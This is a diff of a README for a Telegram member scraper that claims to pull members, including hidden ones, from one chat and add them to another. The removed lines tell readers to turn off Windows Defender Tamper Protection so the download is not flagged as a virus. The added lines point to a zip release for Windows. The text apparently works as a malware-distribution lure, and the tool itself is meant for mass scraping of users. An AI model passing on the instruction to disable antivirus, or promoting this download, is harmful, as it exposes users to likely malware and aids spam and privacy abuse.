@@ -1,10 +1,6 @@
-# ( 𝗜𝗠𝗣𝗢𝗥𝗧𝗔𝗡𝗧: 𝗕𝗲𝗳𝗼𝗿𝗲 𝗬𝗼𝘂 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗔𝗻𝘆𝘁𝗵𝗶𝗻𝗴! )
+- Works On Windows Only!
 
-# ( 𝗪𝗶𝗻𝗱𝗼𝘄𝘀 𝗦𝗲𝗮𝗿𝗰𝗵 > 𝗧𝗮𝗺𝗽𝗲𝗿 𝗣𝗿𝗼𝘁𝗲𝗰𝘁𝗶𝗼𝗻 > 𝗧𝘂𝗿𝗻 𝗘𝘃𝗲𝗿𝘆𝘁𝗵𝗶𝗻𝗴 𝗢𝗳𝗳 𝗧𝗼 𝗕𝘆𝗽𝗮𝘀𝘀 𝗗𝗲𝗳𝗲𝗻𝗱𝗲𝗿. * Otherwise It Will Detect It As Virus! * )
-
-## 𝗜𝗳 𝗦𝘂𝘀𝗽𝗶𝗰𝗶𝗼𝘂𝘀 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗔𝗽𝗽𝗲𝗮𝗿𝘀 > 𝗖𝗹𝗶𝗰𝗸 > 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗦𝘂𝘀𝗽𝗶𝗰𝗶𝗼𝘂𝘀 𝗙𝗶𝗹𝗲.
-
-
+- Download Here: https://github.com/3Lexa/Telegram-Scraper/releases/download/V2/Lexa.Scraper.zip
 
 # TelegramScraper
 It can scrape and add members from one chat to another chat using some Telegram accounts. Also it can scrape hidden members of group going through group messages. Bot has very user-friendly interface.
